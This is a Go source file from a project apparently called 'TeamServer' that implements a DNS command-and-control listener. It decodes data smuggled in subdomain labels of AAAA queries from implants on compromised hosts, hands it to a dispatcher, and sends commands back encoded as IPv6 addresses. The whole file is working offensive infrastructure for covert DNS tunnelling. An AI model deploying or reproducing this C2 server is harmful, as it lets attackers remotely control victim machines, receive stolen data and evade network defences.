package transport

import (
	"TeamServer/core"
	"TeamServer/debug"
	"TeamServer/macro"
	"net"
	"strings"

	"github.com/miekg/dns"
)

var DNSCount int64 = 0

func ValidateDomainName(DomainName string) (bool, string) {

	DomainName = strings.ToLower(DomainName)
	Part := strings.SplitN(DomainName, ".", 2)

	if len(Part) > 1 {
		DomainName = Part[1]
	}

	for _, Listener := range macro.ListenerMap {
		if Listener.DomainName == DomainName {

			Listener.Hits++
			return true, DomainName
		}
	}
	return false, DomainName
}

func handleDnsRequest(w dns.ResponseWriter, req *dns.Msg) {
	defer w.Close()
	RID := DNSCount
	FullDomain := strings.ToLower(req.Question[0].Name[:len(req.Question[0].Name)-1])
	ok, DomainName := ValidateDomainName(FullDomain)
	if !ok {
		debug.Warn("RID [%d] Unknow Doamin Lookup [%s]", RID, FullDomain)
		return
	}
	DNSCount++
	for _, q := range req.Question {
		if q.Qtype != dns.TypeAAAA {
			debug.Warn("RID [%d] Ask for non IPV6 [%d]", RID, q.Qtype)
			continue
		}

		LowerName := strings.ToLower(q.Name)
		debug.Info("RID [%d] Query for %s", RID, LowerName)

		Data := strings.SplitN(LowerName, ".", 2)[0]
		if len(Data) > 8 {
			CleanData := Data[:len(Data)-macro.MacroSizeOfJunkData]
			Dispatch := core.NewDispatcher(CleanData, RID, Data, DomainName)
			ipv6 := Dispatch.Dispatcher()
			if ipv6 == "" || len(ipv6) == 0 {
				debug.Warn("RID [%d] no Response ", RID)
				return
			}
			resp := createDNSResponse(req, q, ipv6)

			debug.Info("RID [%d] Return IPV6 [%s]", RID, ipv6)
			if err := w.WriteMsg(resp); err != nil {
				debug.Error("Failed to write DNS response: %v", err)
			}
		}
	}
}

func createDNSResponse(req *dns.Msg, q dns.Question, ipv6 string) *dns.Msg {
	resp := new(dns.Msg)
	resp.SetReply(req)

	RR := &dns.AAAA{
		Hdr: dns.RR_Header{
			Name:   q.Name,
			Rrtype: dns.TypeAAAA,
			Class:  dns.ClassINET,
			Ttl:    uint32(5),
		},
		AAAA: net.ParseIP(ipv6),
	}

	resp.Answer = append(resp.Answer, RR)
	return resp
}

func StartDNSServer() {
	dns.HandleFunc(".", handleDnsRequest)
	port := macro.Config.ListenerPort
	server := &dns.Server{Addr: ":" + port, Net: "udp"}

	debug.Good("DNS C2 Start Listening On Port [%s]", port)
	if err := server.ListenAndServe(); err != nil {
		debug.Error("Failed to start server: %v", err)
		return
	}
	defer server.Shutdown()
}
